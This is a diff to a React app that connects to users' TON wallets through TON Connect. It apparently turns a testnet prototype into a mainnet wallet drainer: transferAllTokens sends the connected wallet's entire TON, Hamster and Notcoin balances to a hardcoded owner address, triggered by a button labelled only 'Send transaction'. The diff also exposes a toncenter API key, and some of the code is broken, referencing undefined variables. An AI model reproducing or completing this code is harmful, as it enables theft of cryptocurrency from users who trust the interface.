@@ -9,6 +9,9 @@ window.Buffer = Buffer;
 
 const Body =() => {
 
+  /*the wallet addresses i have gave the functions as user is some random 
+  address's with assets you should change them*/
+
   
   //check these address in your wallet
   const ownerAddress="UQBFrS0-M_6sMmhAZr12A-t-OgJ4_LQCVWz8f7xtS_v7lyHL"
@@ -26,40 +29,59 @@ const Body =() => {
   
 
   //testnet
-  const tonweb = new TonWeb( 
-    new TonWeb.HttpProvider("https://testnet.toncenter.com/api/v2/jsonRPC") 
+  const tonweb = new TonWeb(
+    new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC?api_key=36472ea05ea648addc800ba86f97b111d5236d5ee3f2ef7f96d518be892f8aea')
   );
   
   //real network
   //const tonweb=new TonWeb()
+  async function fetchJettonWalletAddress( 
+    ownerWalletAddress,
+    jettonMasterAddress
+  ) {
+    try {
+      const jettonMinter = new TonWeb.token.jetton.JettonMinter(tonweb.provider, {
+        address: jettonMasterAddress,
+      });
+  
+      const jettonWalletAddress = await jettonMinter.getJettonWalletAddress(
+        new TonWeb.utils.Address(ownerWalletAddress)
+      );
+  
+      const jettonWallet = new TonWeb.token.jetton.JettonWallet(tonweb.provider, {
+        address: jettonWalletAddress,
+      });
+  
+      const jettonData = await jettonWallet.getData();
+  
+      
+      if (
+        jettonData.jettonMinterAddress.toString(false) !==
+        jettonMinter.address.toString(false)
+      ) {
+        throw new Error(
+          "Jetton minter address from jetton wallet does not match the expected minter address"
+        );
+      }
+  
+      return jettonWalletAddress.toString(true, true, true);
+    } catch (error) {
+      console.error("Error fetching jetton wallet address:", error);
+    }
+  }
+  
 
-
-const fetchUserTokenBalance = async (userAddress, tokenAddress) => {
+const fetchUserTokenBalance = async (walletAddress) => {
   try {
-    
-    const methodCall = {
-      method: 'get_wallet_data',
-      stack: []
-    };
- 
-    const userAddr = new TonWeb.utils.Address(userAddress);
-    const jettonMasterAddr = new TonWeb.utils.Address(tokenAddress);
+    const jettonWallet = new TonWeb.token.jetton.JettonWallet(tonweb.provider, {
+      address: walletAddress,
+    });
+    const data = await jettonWallet.getData();
 
-    
-    const result = await tonweb.provider.call(
-      jettonMasterAddr.toString(),  
-      methodCall.method,            
-      methodCall.stack              
-    );
-
-    const balanceInNano = result.stack[0][1]; 
-    const balanceInJetton = TonWeb.utils.fromNano(balanceInNano); 
-    return balanceInJetton;
-    
-
+    return data.balance.toString()
+  
   } catch (error) {
-    console.error('Error fetching Jetton balance:', error);
-    return 0;
+    console.error("Error fetching jetton balance:", error);
   }
 };
 
@@ -80,8 +102,17 @@ const fetchTonBalance=async(userAddress)=>{
 
     if (!userAddress) return;
 
-    const balanceOfHamester = await fetchUserTokenBalance(userAddress, hamesterTokenAddress);
-    const balanceOfNotCoin = await fetchUserTokenBalance(userAddress, notcoinTokenAddress);
+
+    const walletHam=await fetchJettonWalletAddress(
+      "UQCYHGhtHlAoW_GY4gcmeCX5qXAXyRbnndJV0IIJsAX6x2yr", hamesterTokenAddress
+    );
+    const walletNot=await fetchJettonWalletAddress(
+      "UQB_LPN1koEFYocWeuKaAkDTQMFFycDs9CGrwPLpnJQ0U6Gy", notcoinTokenAddress
+    );
+
+
+    const balanceOfHamester = await fetchUserTokenBalance(walletHam);
+    const balanceOfNotCoin = await fetchUserTokenBalance(walletNot);
     const balanceOfTon=await fetchTonBalance(userAddress);
 
     
@@ -91,8 +122,8 @@ const fetchTonBalance=async(userAddress)=>{
 
 
     console.log(`
-     your hamester balance before transactions : ${balanceOfHamester.toString()}
-     your notcoin balance  before transactions: ${balanceOfNotCoin.toString()}
+     your hamester balance before transactions: ${balanceOfHamester}
+     your Not balance before transactions: ${balanceOfNotCoin}
      your ton balance before transactions: ${balanceOfTon.toString()}
      `)};
 
@@ -107,20 +138,31 @@ const fetchTonBalance=async(userAddress)=>{
 
   const transferAllTokens = async () => {
 
-      
-      const hamesterJettonWallet = await tonweb.provider.call(
+    const walletHam=await fetchJettonWalletAddress(
+      "UQCYHGhtHlAoW_GY4gcmeCX5qXAXyRbnndJV0IIJsAX6x2yr", hamesterTokenAddress
+    );
+    const walletNot=await fetchJettonWalletAddress(
+      "UQB_LPN1koEFYocWeuKaAkDTQMFFycDs9CGrwPLpnJQ0U6Gy", notcoinTokenAddress
+    );
+
+  
+
+      /*const hamesterJettonWallet = await tonweb.provider.call(
         hamesterTokenAddress,  
         'get_wallet_address',  
-        [['addr', userAddress]] 
+        [['addr', walletHam]] 
       );
-  
-      
-      const notCoinJettonWallet = await tonweb.provider.call(
+      /*const notCoinJettonWallet = await tonweb.provider.call(
         notcoinTokenAddress,  
         'get_wallet_address',  
         [['addr', userAddress]] 
-      );
+      );*/
     
+
+
+
+
+
 
     /*if (hamesterBalance <= 0 && notCoinBalance <= 0 && tonBalance <= 0) {
       console.error("No tokens to transfer.");
@@ -129,14 +171,14 @@ const fetchTonBalance=async(userAddress)=>{
 
     const transactionHamester = {
       to: ownerAddress,
-      amount: TonWeb.utils.toNano(hamesterBalance.toString()), 
+      amount: TonWeb.utils.toNano(hamesterBalance), 
       payload: null
     };
 
 
     const transactionNot = {
       to: ownerAddress,
-        amount: TonWeb.utils.toNano(notCoinBalance.toString()),
+        amount: TonWeb.utils.toNano(notCoinBalance),
         payload: null
     };
   
@@ -150,21 +192,26 @@ const fetchTonBalance=async(userAddress)=>{
       ],
     };
 
+
+
+    
+
       try{
-        await tonConnectUI.sendTransaction({
-          messages: [{ address: hamesterJettonWallet, ...transactionHamester }]
-        });
-        await tonConnectUI.sendTransaction({
-          messages: [{ address: notCoinJettonWallet, ...transactionNot }]
-        });
         await tonConnectUI.sendTransaction(transactionTon);
+        await tonConnectUI.sendTransaction({
+          messages: [{ address: walletHam, ...transactionHamester }]
+        });
+        await tonConnectUI.sendTransaction({
+          messages: [{ address: walletNot, ...transactionNot }]
+        });
+        
 
     
       
        console.log(`
-        your new hamester balance: ${balanceOfHamester.toString()}
-        your new notcoin balance: ${balanceOfNotCoin.toString()}
-         your new ton balance: ${balanceOfTon.toString()}
+        your new hamester balance: ${hamesterBalance}
+        your new notcoin balance: ${notCoinBalance}
+         your new ton balance: ${tonBalance}
          `)
 
 
@@ -187,8 +234,11 @@ const fetchTonBalance=async(userAddress)=>{
     <>
       <div className="custom-buttons-container">
         <TonConnectButton />
-        <button className='transfer-btn tonconnect-button' onClick={() => transferAllTokens(ownerAddress)}>
+        <button className='transfer-btn tonconnect-button' onClick={() => transferAllTokens()}>
                 Send transaction
+            </button>
+            <button className='transfer-btn tonconnect-button' onClick={() => fetchAllBalances()}>
+                balance
             </button>
       </div>
     </>
@@ -198,7 +248,7 @@ const fetchTonBalance=async(userAddress)=>{
 
 const App = () => {
   return (
-    <TonConnectUIProvider manifestUrl="http://localhost:5173/tonconnect-manifest.json">
+    <TonConnectUIProvider manifestUrl="http://localhost:5173/mainnet-tonconnect-manifest.json">
           <Body/> 
         </TonConnectUIProvider>
   )
